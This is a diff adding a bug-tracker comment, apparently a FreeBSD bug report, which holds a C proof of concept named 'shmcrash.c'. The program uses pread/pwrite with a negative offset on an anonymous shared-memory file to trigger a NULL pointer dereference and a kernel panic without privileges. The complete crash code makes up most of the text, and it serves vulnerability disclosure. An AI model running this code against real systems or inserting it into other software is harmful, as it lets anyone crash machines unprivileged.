@@ -1,0 +1,8 @@
+{
+ "id": 923755,
+ "bug_id": 217429,
+ "attachment_id": 0,
+ "creation_time": "2017-02-28T19:39:52Z",
+ "creator": "tim.newsham@nccgroup.trust",
+ "text": "/*\n * shmcrash.c\n *     Crash FreeBSD with pread/pwrite on a shm file.\n\nDescription:\nAnon shm files create with shm_open have a NULL fp-\u003ef_vnode.\nBut shm_preadv and shm_pwritev will access through this pointer\nwhen the offset is negative:\n\n    error = fget_read(td, fd, cap_rights_init(\u0026rights, CAP_PREAD), \u0026fp);\n    if (error)\n        return (error);\n    if (!(fp-\u003ef_ops-\u003efo_flags \u0026 DFLAG_SEEKABLE))\n        error = ESPIPE;\n    else if (offset \u003c 0 \u0026\u0026 fp-\u003ef_vnode-\u003ev_type != VCHR)\n        error = EINVAL;\n    else\n        error = dofileread(td, fd, fp, auio, offset, FOF_OFFSET);\n\nThis causes a NULL pointer dereference in kernel, and a panic.\nNo privileges are required.\n */\n\n#include \u003cstdio.h\u003e\n#include \u003cstdlib.h\u003e\n#include \u003csys/types.h\u003e\n#include \u003csys/mman.h\u003e\n#include \u003csys/syscall.h\u003e\n#include \u003cfcntl.h\u003e\n#include \u003cunistd.h\u003e\n\nvoid xperror(char *msg) {\n    perror(msg);\n    exit(1);\n}\n\nint main(int argc, char **argv)\n{\n    char buf[64];\n    int fd, x, w;\n\n    w = (argc == 2 \u0026\u0026 argv[1][0] == 'w');\n    printf(\"we will %s\\n\", w ? \"write\" : \"read\");\n\n    fd = shm_open(SHM_ANON, O_RDWR, 0);\n    if(fd == -1) xperror(\"shm_open\");\n    printf(\"fd %d\\n\", fd); fflush(stdout);\n\n    if(w)\n        x = pwrite(fd, \"test\", 4, -1);\n    else\n        x = pread(fd, buf, sizeof buf, -1);\n    printf(\"io %d\\n\", x);\n    return 0;\n}"
+}
